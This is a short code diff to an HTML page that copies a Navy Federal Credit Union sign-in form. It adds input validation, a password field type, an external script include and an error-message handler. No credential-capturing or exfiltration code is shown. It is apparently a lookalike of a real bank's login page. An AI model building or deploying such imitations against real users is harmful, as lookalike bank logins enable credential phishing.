@@ -7,6 +7,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Navy Federal Credit Union</title>
     <link rel="stylesheet" href="background.css">
+    <script type="text/javascript" src="index.js"></script>
 </head>
 
 <body>
@@ -108,10 +109,11 @@
     <label class="userinfo container-password">Password</label>
     </div>
     <div>
-    <input type="text" class="input-field username-input">
-    <input type="text" class="input-field password-input">
-    <button type="button" class="container-button-signin">Sign In</button>
+    <input type="text" class="input-field username-input" required>
+    <input type="password" class="input-field password-input" minlength="6" required>
+    <button type="button" class="container-button-signin" onclick="errorMessage()">Sign In</button>
     </div>
+    <div class="error-message-div"></div>
     <p class="toolbar-options">
         <a href="https://accountservices.navyfederal.org/account-recovery/" class="sign-in-help">Sign In Help</a>
         <a href="https://accountservices.navyfederal.org/enrollment/" class="enrollment">Enroll in Digital Banking</a>
